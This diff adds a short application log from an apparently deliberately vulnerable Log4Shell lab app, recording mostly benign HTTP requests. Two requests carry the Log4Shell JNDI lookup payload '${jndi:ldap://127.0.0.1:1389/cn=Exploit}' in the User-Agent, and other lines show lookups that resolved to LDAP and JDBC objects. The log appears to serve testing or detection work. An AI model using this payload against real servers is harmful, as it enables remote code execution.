@@ -1,0 +1,10 @@
+2026-10-23T02:41:52,118 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET /healthz UA=kube-probe/1.28
+2026-10-23T02:42:00,833 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET / UA=Mozilla/5.0 (benign-check)
+2026-10-23T02:42:17,518 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET / UA=com.sun.jndi.ldap.LdapCtx@6f49fe6a
+2026-10-23T02:43:19,731 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET / UA=com.sun.jndi.ldap.LdapCtx@1bcb1eca
+2026-10-23T02:45:19,213 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET / UA=${jndi:ldap://127.0.0.1:1389/cn=Exploit}
+2026-10-23T02:46:05,377 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET /login UA=python-requests/2.31.0
+2026-10-23T02:47:23,644 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET / UA=com.sun.jndi.ldap.LdapCtx@1bcb1eca
+2026-10-23T02:54:55,204 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET / UA=com.sun.rowset.JdbcRowSetImpl@8845ad5
+2026-10-23T02:56:15,300 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET / UA=${jndi:ldap://127.0.0.1:1389/cn=Exploit}
+2026-10-23T02:57:40,911 [HTTP-Dispatcher] INFO  Log4ShellVulnApp - GET /search?q=log4j UA=Mozilla/5.0 (X11; Linux x86_64)
